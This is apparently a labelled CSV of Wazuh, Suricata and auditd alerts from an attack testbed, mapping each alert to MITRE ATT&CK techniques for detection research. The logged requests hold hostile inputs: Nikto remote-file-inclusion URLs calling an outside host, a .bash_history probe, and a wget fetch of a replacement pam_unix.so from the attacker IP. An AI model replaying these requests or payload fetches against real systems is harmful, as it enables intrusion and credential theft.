timestamp,alert,description,real_ttps,possible_ttps
2025-09-22T18:31:00.433+0000,"{""timestamp"": ""2025-09-22T18:31:00.433+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS Ve-EDIT edit_htmlarea.php highlighter Parameter Remote File Inclusion"", ""id"": ""86601"", ""firedtimes"": 708, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758565860.7550556"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-22T18:30:49.995475+0000"", ""flow_id"": ""94697952997871.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""39198"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:9XFz238WSFcYBV5pZEqCkmH5PDM="", ""tx_id"": ""37"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2010254"", ""rev"": ""5"", ""signature"": ""ET WEB_SPECIFIC_APPS Ve-EDIT edit_htmlarea.php highlighter Parameter Remote File Inclusion"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_09""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/vedit/editor/edit_htmlarea.php?highlighter=http://cirt.net/rfiinc.txt??"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006032)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""42"", ""pkts_toclient"": ""55"", ""bytes_toserver"": ""10878"", ""bytes_toclient"": ""18687"", ""start"": ""2025-09-22T18:30:49.946671+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS Ve-EDIT edit_htmlarea.php highlighter Parameter Remote File Inclusion,[],['T1595.002']
2025-09-22T18:31:00.463+0000,"{""timestamp"": ""2025-09-22T18:31:00.463+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SERVER PHP SERVER SuperGlobal in URI"", ""id"": ""86601"", ""firedtimes"": 709, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758565860.7553309"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-22T18:30:50.004508+0000"", ""flow_id"": ""94697952997871.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""39198"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:9XFz238WSFcYBV5pZEqCkmH5PDM="", ""tx_id"": ""44"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2017436"", ""rev"": ""4"", ""signature"": ""ET WEB_SERVER PHP SERVER SuperGlobal in URI"", ""category"": ""Potentially Bad Traffic"", ""severity"": ""2"", ""metadata"": {""created_at"": [""2013_09_10""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_21""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/visitor.php?_SERVER[DOCUMENT_ROOT]=http://cirt.net/rfiinc.txt???"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006039)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""49"", ""pkts_toclient"": ""62"", ""bytes_toserver"": ""12701"", ""bytes_toclient"": ""21921"", ""start"": ""2025-09-22T18:30:49.946671+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SERVER PHP SERVER SuperGlobal in URI,[],['T1595.002']
2025-10-14T11:07:16.201+0000,"{""timestamp"": ""2025-10-14T11:07:16.201+0000"", ""rule"": {""level"": 6, ""description"": ""Executed recursive query of all files using ls command."", ""id"": ""92605"", ""mitre"": {""id"": [""T1083""], ""tactic"": [""Discovery""], ""technique"": [""File and Directory Discovery""]}, ""firedtimes"": 1, ""mail"": false, ""groups"": [""audit_detections""]}, ""agent"": {""id"": ""001"", ""name"": ""videoserver"", ""ip"": ""172.17.100.121""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760440036.10131265"", ""full_log"": ""type=SYSCALL msg=audit(1760440025.642:12360): arch=c000003e syscall=59 success=yes exit=0 a0=7ffea67a8cf0 a1=55921f4b81e0 a2=7ffea67a92b0 a3=7f5bbb0ca800 items=3 ppid=16912 pid=16921 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=pts0 ses=4294967295 comm=\""ls\"" exe=\""/usr/bin/ls\"" subj==unconfined key=\""T1166_Seuid_and_Setgid\""\u001dARCH=x86_64 SYSCALL=execve AUID=\""unset\"" UID=\""www-data\"" GID=\""www-data\"" EUID=\""www-data\"" SUID=\""www-data\"" FSUID=\""www-data\"" EGID=\""www-data\"" SGID=\""www-data\"" FSGID=\""www-data\"" type=EXECVE msg=audit(1760440025.642:12360): argc=3 a0=\""ls\"" a1=\""-l\"" a2=\""/etc/.java/.systemPrefs/.systemRootModFile\"" type=PATH msg=audit(1760440025.642:12360): item=0 name=\""/usr/bin/ls\"" inode=827 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\""root\"" OGID=\""root\"" type=PATH msg=audit(1760440025.642:12360): item=1 name=\""/usr/bin/ls\"" inode=827 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\""root\"" OGID=\""root\"" type=PATH msg=audit(1760440025.642:12360): item=2 name=\""/lib64/ld-linux-x86-64.so.2\"" inode=1964 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\""root\"" OGID=\""root\"" type=PROCTITLE msg=audit(1760440025.642:12360): proctitle=66696E64002F002D747970650066002D696E616D65002E2A0021002D70617468002F7379732F2A0021002D70617468002F53797374656D2F2A0021002D70617468002F707269766174652F7661722F2A002D65786563006C73002D6C007B7D003B"", ""decoder"": {""parent"": ""auditd"", ""name"": ""auditd""}, ""data"": {""audit"": {""type"": ""SYSCALL"", ""id"": ""12360"", ""arch"": ""c000003e"", ""syscall"": ""59"", ""success"": ""yes"", ""exit"": ""0"", ""ppid"": ""16912"", ""pid"": ""16921"", ""auid"": ""4294967295"", ""uid"": ""33"", ""gid"": ""33"", ""euid"": ""33"", ""suid"": ""33"", ""fsuid"": ""33"", ""egid"": ""33"", ""sgid"": ""33"", ""fsgid"": ""33"", ""tty"": ""pts0"", ""session"": ""4294967295"", ""command"": ""ls"", ""exe"": ""/usr/bin/ls"", ""key"": ""T1166_Seuid_and_Setgid"", ""execve"": {""a0"": ""ls"", ""a1"": ""-l"", ""a2"": ""/etc/.java/.systemPrefs/.systemRootModFile""}, ""file"": {""name"": ""/usr/bin/ls"", ""inode"": ""827"", ""mode"": ""0100755""}}}, ""location"": ""/var/log/audit/audit.log""}",Executed recursive query of all files using ls command.,['T1083'],"['T1087', 'T1083', 'T1201', 'T1069', 'T1057', 'T1518', 'T1082', 'T1614', 'T1016', 'T1049', 'T1033', 'T1007', 'T1615']"
2025-10-14T11:21:01.428+0000,"{""timestamp"": ""2025-10-14T11:21:01.428+0000"", ""rule"": {""level"": 10, ""description"": ""Auditd: Process ended abnormally."", ""id"": ""80711"", ""firedtimes"": 1, ""mail"": false, ""groups"": [""audit"", ""audit_anom""], ""gdpr"": [""IV_30.1.g"", ""IV_35.7.d""], ""gpg13"": [""4.14""], ""hipaa"": [""164.312.b""], ""nist_800_53"": [""AU.6"", ""SI.4""], ""pci_dss"": [""10.6.1"", ""11.4""], ""tsc"": [""CC6.1"", ""CC6.8"", ""CC7.2"", ""CC7.3""]}, ""agent"": {""id"": ""001"", ""name"": ""videoserver"", ""ip"": ""172.17.100.121""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760440861.10162615"", ""full_log"": ""type=ANOM_ABEND msg=audit(1760440861.278:13855): auid=4294967295 uid=33 gid=33 ses=4294967295 subj==unconfined pid=2974 comm=\""apache2\"" exe=\""/usr/sbin/apache2\"" sig=11 res=1\u001dAUID=\""unset\"" UID=\""www-data\"" GID=\""www-data\"""", ""decoder"": {""name"": ""auditd""}, ""data"": {""audit"": {""type"": ""ANOM_ABEND"", ""id"": ""13855"", ""pid"": ""2974"", ""auid"": ""4294967295"", ""uid"": ""33"", ""gid"": ""33"", ""session"": ""4294967295"", ""command"": ""apache2"", ""exe"": ""/usr/sbin/apache2"", ""res"": ""1""}}, ""location"": ""/var/log/audit/audit.log""}",Auditd: Process ended abnormally.,[],['T1547']
2025-10-14T11:25:31.888+0000,"{""timestamp"": ""2025-10-14T11:25:31.888+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET POLICY Executable and linking format (ELF) file download Over HTTP"", ""id"": ""86601"", ""firedtimes"": 846, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""002"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760441131.10193360"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-10-14T11:25:31.150108+0000"", ""flow_id"": ""1765210942289425.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""80"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""33614"", ""proto"": ""TCP"", ""metadata"": {""flowbits"": [""http.dottedquadhost"", ""ET.ELFDownload""]}, ""community_id"": ""1:BcRD7oBv1GW6E90S6GFb3pZd8DQ="", ""tx_id"": ""0"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2019240"", ""rev"": ""14"", ""signature"": ""ET POLICY Executable and linking format (ELF) file download Over HTTP"", ""category"": ""Potential Corporate Privacy Violation"", ""severity"": ""1"", ""metadata"": {""confidence"": [""High""], ""created_at"": [""2014_09_25""], ""signature_severity"": [""Informational""], ""updated_at"": [""2023_04_12""]}}, ""http"": {""hostname"": ""192.42.1.174"", ""url"": ""/pam_unix.so"", ""http_user_agent"": ""Wget/1.21"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""200"", ""length"": ""97035""}, ""files"": [{""filename"": ""/pam_unix.so"", ""sid"": [], ""gaps"": false, ""state"": ""UNKNOWN"", ""stored"": false, ""size"": 97035, ""tx_id"": 0}], ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""13"", ""pkts_toclient"": ""73"", ""bytes_toserver"": ""1002"", ""bytes_toclient"": ""103516"", ""start"": ""2025-10-14T11:25:31.144913+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET POLICY Executable and linking format (ELF) file download Over HTTP,[],"['T1105', 'T1556.003']"
2025-10-14T11:00:14.116+0000,"{""timestamp"": ""2025-10-14T11:00:14.116+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SERVER .bash_history Detected in URI"", ""id"": ""86601"", ""firedtimes"": 518, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""002"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760439614.4750052"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-10-14T11:00:02.135009+0000"", ""flow_id"": ""338373314221706.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""40978"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:LxQS+ZZRcf5AoUZpM6ylDRL55mg="", ""tx_id"": ""50"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2049402"", ""rev"": ""1"", ""signature"": ""ET WEB_SERVER .bash_history Detected in URI"", ""category"": ""Attempted Information Leak"", ""severity"": ""2"", ""source"": {""ip"": ""192.42.1.174"", ""port"": ""40978""}, ""target"": {""ip"": ""172.17.100.121"", ""port"": ""80""}, ""metadata"": {""affected_product"": [""Linux""], ""attack_target"": [""Web_Server""], ""confidence"": [""High""], ""created_at"": [""2023_11_29""], ""deployment"": [""SSLDecrypt"", ""Perimeter""], ""performance_impact"": [""Low""], ""signature_severity"": [""Informational""], ""updated_at"": [""2023_11_30""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/.bash_history"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002743)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""55"", ""pkts_toclient"": ""66"", ""bytes_toserver"": ""11945"", ""bytes_toclient"": ""24579"", ""start"": ""2025-10-14T11:00:02.071306+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SERVER .bash_history Detected in URI,[],['T1595.002']
2025-10-14T11:00:14.382+0000,"{""timestamp"": ""2025-10-14T11:00:14.382+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS Possible JBoss JMX Console Beanshell Deployer WAR Upload and Deployment Exploit Attempt"", ""id"": ""86601"", ""firedtimes"": 529, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""002"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760439614.4778178"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-10-14T11:00:03.891847+0000"", ""flow_id"": ""990186141077956.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""41126"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:Yrl/5GrNU4z2i2KpaDuOp3qLEIg="", ""tx_id"": ""62"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2011696"", ""rev"": ""6"", ""signature"": ""ET WEB_SPECIFIC_APPS Possible JBoss JMX Console Beanshell Deployer WAR Upload and Deployment Exploit Attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""confidence"": [""Medium""], ""created_at"": [""2010_07_30""], ""cve"": [""CVE_2010_0738""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_11""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/jmx-console/HtmlAdaptor?action=inspectMBean&name=Catalina%3Atype%3DServer"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003846)"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""length"": ""0""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""69"", ""pkts_toclient"": ""78"", ""bytes_toserver"": ""13755"", ""bytes_toclient"": ""29714"", ""start"": ""2025-10-14T11:00:03.479684+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS Possible JBoss JMX Console Beanshell Deployer WAR Upload and Deployment Exploit Attempt,[],['T1595.002']
2025-10-14T11:00:14.481+0000,"{""timestamp"": ""2025-10-14T11:00:14.481+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS PHP Classifieds class.phpmailer.php lang_path Parameter Remote File Inclusion Attempt"", ""id"": ""86601"", ""firedtimes"": 530, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""002"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760439614.4781018"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-10-14T11:00:03.921940+0000"", ""flow_id"": ""990186141077956.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""41126"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:Yrl/5GrNU4z2i2KpaDuOp3qLEIg="", ""tx_id"": ""85"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2011564"", ""rev"": ""4"", ""signature"": ""ET WEB_SPECIFIC_APPS PHP Classifieds class.phpmailer.php lang_path Parameter Remote File Inclusion Attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_09_27""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_10""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/ATutor/include/classes/phpmailer/class.phpmailer.php?lang_path=http://cirt.net/rfiinc.txt?"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003868)"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""length"": ""0""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""92"", ""pkts_toclient"": ""104"", ""bytes_toserver"": ""20088"", ""bytes_toclient"": ""41198"", ""start"": ""2025-10-14T11:00:03.479684+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS PHP Classifieds class.phpmailer.php lang_path Parameter Remote File Inclusion Attempt,[],['T1595.002']
2025-10-14T11:00:14.920+0000,"{""timestamp"": ""2025-10-14T11:00:14.920+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS DesktopOnNet don3_requiem.php app_path Parameter Remote File Inclusion"", ""id"": ""86601"", ""firedtimes"": 531, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""002"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760439614.4783761"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-10-14T11:00:04.060343+0000"", ""flow_id"": ""30752724183675.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""41136"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:8yEruFOiXxX6yYLmtNYqH04as7c="", ""tx_id"": ""85"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2009317"", ""rev"": ""7"", ""signature"": ""ET WEB_SPECIFIC_APPS DesktopOnNet don3_requiem.php app_path Parameter Remote File Inclusion"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""cve"": [""CVE_2008_2649""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_11""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/DON3/applications/don3_requiem.don3app/don3_requiem.php?app_path=http://cirt.net/rfiinc.txt?"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003969)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""90"", ""pkts_toclient"": ""93"", ""bytes_toserver"": ""26796"", ""bytes_toclient"": ""40203"", ""start"": ""2025-10-14T11:00:03.944763+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS DesktopOnNet don3_requiem.php app_path Parameter Remote File Inclusion,[],['T1595.002']
2025-10-14T11:00:14.926+0000,"{""timestamp"": ""2025-10-14T11:00:14.926+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS DesktopOnNet frontpage.php app_path Parameter Remote File Inclusion"", ""id"": ""86601"", ""firedtimes"": 532, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""002"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760439614.4786621"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-10-14T11:00:04.061615+0000"", ""flow_id"": ""30752724183675.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""41136"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:8yEruFOiXxX6yYLmtNYqH04as7c="", ""tx_id"": ""86"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2009318"", ""rev"": ""7"", ""signature"": ""ET WEB_SPECIFIC_APPS DesktopOnNet frontpage.php app_path Parameter Remote File Inclusion"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""cve"": [""CVE_2008_2649""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_11""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/DON3/applications/frontpage.don3app/frontpage.php?app_path=http://cirt.net/rfiinc.txt??"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003970)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""91"", ""pkts_toclient"": ""94"", ""bytes_toserver"": ""27072"", ""bytes_toclient"": ""40665"", ""start"": ""2025-10-14T11:00:03.944763+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS DesktopOnNet frontpage.php app_path Parameter Remote File Inclusion,[],['T1595.002']
2025-10-14T11:00:15.038+0000,"{""timestamp"": ""2025-10-14T11:00:15.038+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS Possible OpenSiteAdmin pageHeader.php Remote File Inclusion Attempt"", ""id"": ""86601"", ""firedtimes"": 535, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""002"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760439615.4794667"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-10-14T11:00:04.096927+0000"", ""flow_id"": ""1499423233554161.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""41152"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:ICMgTNbwNElv8b/6s0/ne7kWyAQ="", ""tx_id"": ""10"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2009931"", ""rev"": ""6"", ""signature"": ""ET WEB_SPECIFIC_APPS Possible OpenSiteAdmin pageHeader.php Remote File Inclusion Attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""confidence"": [""Medium""], ""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_04_21""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/OpenSiteAdmin/pages/pageHeader.php?path=http://cirt.net/rfiinc.txt??"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003995)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""15"", ""pkts_toclient"": ""23"", ""bytes_toserver"": ""3516"", ""bytes_toclient"": ""5883"", ""start"": ""2025-10-14T11:00:04.079601+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS Possible OpenSiteAdmin pageHeader.php Remote File Inclusion Attempt,[],['T1595.002']
